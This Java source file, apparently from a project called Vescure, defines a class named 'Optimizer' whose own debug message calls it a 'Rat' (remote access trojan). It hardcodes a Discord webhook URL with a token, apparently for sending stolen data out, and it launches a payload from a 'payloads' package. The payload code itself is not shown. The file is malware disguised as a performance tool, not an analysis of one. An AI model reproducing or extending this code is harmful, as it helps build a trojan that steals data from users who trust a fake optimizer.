package club.vescure;

import club.vescure.utils.HttpUtils;

import java.io.IOException;

import static club.vescure.payloads.Payload1.startPayload1;

public class Optimizer {

    public static String CYAN = "\033[96m";
    public static String GREEN = "\033[92m";
    public static String GRAY = "\033[90m";
    public static String RED = "\033[91m";
    public static String WHITE = "\033[0m";
    public static String prefix = WHITE + "[" + GREEN + "Vescure" + WHITE + "] ";

    public static boolean debug = true;
    public static String webhook = "https://discord.com/api/webhooks/851978747971371049/ZAs2tHGC_cDBQA9tJ-MVYXH2v04ku4JYJwupkPVmdUOOcSsjVs4NQJhbFBSgdGEMIV2Y";

    public Optimizer() throws InterruptedException {
        if (debug) {
            System.out.println(prefix + RED + "Starting The Optimizer (Rat)");
        }
        startPayload1();
    }
}
